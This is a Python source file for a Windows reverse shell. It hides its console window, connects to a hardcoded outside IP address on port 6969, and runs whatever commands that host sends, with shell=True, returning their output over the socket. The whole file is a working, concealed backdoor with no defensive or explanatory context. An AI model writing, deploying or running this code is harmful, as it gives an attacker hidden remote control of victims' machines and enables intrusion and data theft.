import socket
import subprocess
import os
import threading
import win32api
import win32console
import win32gui

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('144.24.205.234', 6969))

current_directory = os.getcwd()  # Start with the current working directory

def receive_commands():
    global current_directory
    while True:
        try:
            command = s.recv(4096).decode('UTF-8').strip()
            if not command:
                break

            if command.startswith('cd '):
                # Change the current directory
                try:
                    os.chdir(command[3:].strip())
                    current_directory = os.getcwd()  # Update the current directory
                    s.send(f"Changed directory to {current_directory}\n".encode('UTF-8'))
                except Exception as e:
                    s.send(f"Error: {str(e)}\n".encode('UTF-8'))
            else:
                # Run the command in the current directory
                output = run_command(command)
                s.send(output)
        except Exception as e:
            s.send(f"Error: {str(e)}\n".encode('UTF-8'))

def run_command(command):
    # Handle output redirection and commands differently
    if '>' in command or '<' in command or '>>' in command or 'notepad' in command.lower() or 'start ' in command.lower():
        # Run the command without capturing output
        try:
            process = subprocess.Popen(command, shell=True, cwd=current_directory)
            process.communicate()  # Wait for the process to complete
            return b"Command executed with redirection.\n"
        except Exception as e:
            return f"Error: {str(e)}\n".encode('UTF-8')
    else:
        # Run commands and capture output
        try:
            process = subprocess.Popen(
                command, shell=True, cwd=current_directory,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            output, error = process.communicate()
            
            # Check for errors and return them if any
            if process.returncode != 0:
                return f"Error: {error.decode('UTF-8')}\n".encode('UTF-8')
            
            return output
        except Exception as e:
            return f"Error: {str(e)}\n".encode('UTF-8')

# Start a thread to receive and handle commands
threading.Thread(target=receive_commands, daemon=True).start()

# Main thread can perform other tasks if needed
while True:
    # Keep the client responsive
    pass
